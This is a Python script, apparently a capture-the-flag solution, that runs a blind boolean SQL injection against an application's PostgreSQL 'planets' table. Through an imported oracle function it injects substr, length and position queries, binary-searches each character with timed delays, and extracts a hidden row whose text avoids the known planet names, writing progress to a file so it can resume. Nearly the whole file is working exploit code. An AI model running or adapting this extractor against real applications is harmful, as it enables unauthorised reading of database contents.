"""Extract the 8th row of planets: the one whose designation is not a known planet.

Resumable: progress goes to row8.txt after every character so a restart continues.
The collation is case-insensitive, so the candidate set carries one representative per
case class (lowercase letters only) and the real case is recovered afterwards by
submitting candidates to the app's own matcher.
"""
import os
import sys
import time
from cmdexec import bit

GAP = 2.0
ROWSET = list("abcdefghijklmnopqrstuvwxyz0123456789 ,.-_()[]:;/~")
NOT_KNOWN = ("NOT (planets::text LIKE '%MERCURY%' OR planets::text LIKE '%EARTH%' "
             "OR planets::text LIKE '%MARS%' OR planets::text LIKE '%JUPITER%' "
             "OR planets::text LIKE '%SATURN%' OR planets::text LIKE '%URANUS%' "
             "OR planets::text LIKE '%NEPTUNE%')")
UNK = "(SELECT planets::text FROM planets WHERE %s LIMIT 1)" % NOT_KNOWN
OUT = "row8.txt"


def get_int(expr, lo, hi):
    while lo < hi:
        mid = (lo + hi + 1) // 2
        time.sleep(GAP)
        if bit("(%s)>=%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


def one_char(expr, i, cands):
    cands = list(cands)
    while len(cands) > 1:
        half = cands[:len(cands) // 2]
        inlist = ",".join("'" + c.replace("'", "''") + "'" for c in half)
        time.sleep(GAP)
        if bit("(SELECT substr((%s),%d,1)) IN (%s)" % (expr, i, inlist)):
            cands = half
        else:
            cands = cands[len(half):]
    return cands[0]


if __name__ == "__main__":
    print("[*] unknown row present: %s" % bit("(SELECT COUNT(*) FROM planets WHERE %s)>0" % NOT_KNOWN), flush=True)
    n = get_int("length((%s))" % UNK, 0, 120)
    print("[*] row text length: %d" % n, flush=True)
    first_comma = get_int("position(',' in (%s))" % UNK, 0, 40)
    print("[*] first comma at: %d" % first_comma, flush=True)

    have = ""
    if os.path.exists(OUT):
        have = open(OUT).read().strip()
        print("[*] resuming with %d chars" % len(have), flush=True)
    f = open(OUT, "w")
    for i in range(len(have) + 1, n + 1):
        c = one_char(UNK, i, ROWSET)
        f.write(c)
        f.flush()
        os.fsync(f.fileno())
        sys.stdout.write("\r[%d/%d] %s%s" % (i, n, have, "".join(open(OUT).read())))
        sys.stdout.flush()
    print("\n[+] row 8 = %r" % open(OUT).read(), flush=True)
